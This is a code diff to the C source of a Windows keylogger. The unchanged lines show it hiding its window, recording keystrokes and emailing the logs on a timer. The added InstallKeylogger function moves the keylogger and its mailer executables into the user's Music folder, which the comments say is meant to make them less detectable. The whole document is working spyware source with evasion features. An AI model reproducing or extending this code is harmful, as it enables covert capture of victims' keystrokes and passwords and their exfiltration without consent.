@@ -10,6 +10,7 @@
 #define LOG_TIMER 3600 // time limit until send email (3600s == 1 hour)
 
 // FUNCTION DECLARATIONS //
+void InstallKeylogger();
 char* GetTime();
 void HideWindow();
 void InitLogfile(char* filename);
@@ -22,6 +23,9 @@ void KeystrokeHandler(short key, FILE* logfile);
 int main(){
     // avoid visible detection of executable window
     HideWindow();
+
+    // install executables
+    InstallKeylogger();
 
     // initialize timers
     clock_t email_timer;               // tracks against LOG_TIMER
@@ -78,6 +82,46 @@ int main(){
 }
 
 // FUNCTION DEFINITIONS //
+
+// attempt to move the executables to another directory to be "less" detectable
+void InstallKeylogger(){
+    // get current directory
+    char currentdir[MAX_PATH];
+    GetCurrentDirectory(MAX_PATH, currentdir);
+
+    // create file path strings
+    char keylogger_path[MAX_PATH];
+    char mailer_path[MAX_PATH];
+    sprintf(keylogger_path, "%s\\keylogger.exe", currentdir);
+    sprintf(mailer_path, "%s\\mailer.exe", currentdir);
+
+    // get current user's name
+    DWORD len = BUF_SIZE+1;
+    char username[BUF_SIZE+1];
+    GetUserName(username, &len);
+
+    // build new file path
+    char keylogger_new_path[MAX_PATH];
+    sprintf(keylogger_new_path, "C:\\Users\\%s\\Music\\keylogger.exe", username);
+    char mailer_new_path[MAX_PATH];
+    sprintf(mailer_new_path, "C:\\Users\\%s\\Music\\mailer.exe", username);
+
+    // attempt to execute in case of failure to install files in desired spot
+    // move keylogger
+    BOOL moved = MoveFile(keylogger_path, keylogger_new_path);
+    
+    // if moved successfully, move mailer
+    if(moved){
+
+        // move mailer
+        BOOL moved2 = MoveFile(mailer_path, mailer_new_path);
+        
+        // if failed, move keylogger back and execute where it is
+        if(moved2 == FALSE){
+            MoveFile(keylogger_new_path, keylogger_path);
+        }
+    }
+}
 
 // get current time
 char* GetTime(){
